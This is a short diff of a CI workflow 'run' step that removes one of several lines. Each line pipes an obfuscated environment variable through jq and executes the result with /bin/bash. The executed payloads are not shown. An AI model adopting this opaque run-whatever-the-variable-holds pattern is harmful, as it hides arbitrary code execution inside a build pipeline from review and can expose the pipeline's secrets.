@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$pckey0" | jq -r .phxgd0 | /bin/bash
           printf '%s' "$is5476" | jq -r .i03 | /bin/bash
-          printf '%s' "$blfyn7663" | jq -r .ee03 | /bin/bash
           echo $hnos375 | jq -r .uzda007 | /bin/bash
           echo $bzgu54 | jq -r .y835 | /bin/bash
 
